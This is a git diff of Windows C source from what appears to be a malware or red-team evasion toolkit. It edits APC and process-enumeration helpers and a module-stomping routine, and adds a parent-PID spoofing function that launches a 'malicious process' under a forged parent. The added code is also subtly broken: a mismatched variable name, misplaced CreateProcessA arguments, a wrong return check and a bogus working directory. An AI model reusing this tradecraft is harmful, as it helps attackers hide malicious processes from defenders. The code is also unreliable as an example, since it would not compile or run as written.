@@ -6,7 +6,7 @@ VOID AlertableFunction0(void)
 	printf("[!] APC \"Sleep Ex\" Fired Back!\n");
 
 }
-
+ 
 VOID AlertableFunction1(void)
 {
 	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
@@ -200,8 +200,8 @@ BOOLEAN CreateSuspendedProcess
 BOOLEAN EnumProcessNTQuerySystemInformation
 (
 	IN     LPCWSTR szProcName,
-	   OUT PDWORD  pdwPid,
-	   OUT PHANDLE phProcess
+	OUT PDWORD  pdwPid,
+	OUT PHANDLE phProcess
 )
 {
 	ULONG                        uReturnLen1, uReturnLen2;
@@ -218,17 +218,17 @@ BOOLEAN EnumProcessNTQuerySystemInformation
 	PVOID pValueToFree = (PVOID)SystemProcInfo;
 
 	if (pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0) goto _cleanup;
-
-	while (TRUE)
-	{
+	while (TRUE) {
 		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
-			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);
+			*phProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, *pdwPid);
+			if (!*phProcess) goto _cleanup;
 			bState = TRUE;
 		_cleanup:
 			if (SystemProcInfo != NULL) LocalFree(pValueToFree);
 			return bState;
 		}
+
 		if (!SystemProcInfo->NextEntryOffset) goto _cleanup;
 		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
 	}
@@ -725,11 +725,68 @@ BOOL FetchStompingTarget
 		printf("[!] Failed To Load Dll: %s\n", pSacrificialDllName);
 		return FALSE;
 	}
-
+	
 	if (!(*pTargetFunctionAddress = GetProcAddress(hSacrificialModule, pSacrificialFuncName))) 
 	{
 		printf("[!] Failed To Load Function: %s\n", pSacrificialFuncName);
 		return FALSE;
 	}
+	return TRUE;
+}
+
+BOOLEAN SpoofParentProcessId
+(
+	IN     LPSTR   pMaliciousProcessName, 
+	IN     HANDLE  hDesiredParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
+	   OUT PDWORD  pdwMaliciousProcessPID,
+	   OUT PHANDLE phMaliciousProcessHandle,
+	   OUT PDWORD  pdwMaliciousThreadId
+)
+{
+	CHAR                               lpPath[MAX_PATH * 2];
+	CHAR                               WnDr[MAX_PATH];
+	SIZE_T						sThreadAttributeListSize;
+	PPROC_THREAD_ATTRIBUTE_LIST pThreadsAttributeList_t;
+	STARTUPINFOEXA				StartupInfoEx_t	= { .StartupInfo.cb = sizeof(STARTUPINFOEXA) };
+	HANDLE						hHeap			= GetProcessHeap();
+	PROCESS_INFORMATION         ProcessInformation_t = { 0 };
+	PUCHAR SpoofedCommandLineArgumet;
+	
+	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttributeListSize);
+
+	if (!(pThreadsAttributeList_t = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize))) return FALSE;
+
+	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+		//printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	if (sprintf_s(lpPath, MAX_PATH,"%s\\System32\\%s", WnDr, pMaliciousProcessName) == 1) return FALSE;
+
+	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, NULL, &sThreadAttributeListSize)) return FALSE;
+
+	if (!UpdateProcThreadAttribute(pThreadsAttributeList_t, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hDesiredParentProcessHandle, sizeof(HANDLE), NULL, NULL)) return FALSE;
+
+	if (!(SpoofedCommandLineArgument = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH))) return FALSE;
+
+	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;
+	
+	if (!SpoofedCommandLineArgument) return FALSE;
+	sprintf_s(SpoofedCommandLineArgument, MAX_PATH, "%s -embed", lpPath);
+	if (!CreateProcessA(
+		NULL,
+		lpPath,
+		SpoofedCommandLineArgument,
+		NULL,
+		FALSE,
+		EXTENDED_STARTUPINFO_PRESENT | DETACHED_PROCESS,
+		NULL,
+		"C:\\System32",
+		&StartupInfoEx_t.StartupInfo,
+		&ProcessInformation_t))
+		return FALSE;
+	*pdwMaliciousProcessPID   = ProcessInformation_t.dwProcessId;
+	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
+	*pdwMaliciousThreadId = ProcessInformation_t.dwThreadId;
+	 
 	return TRUE;
 }
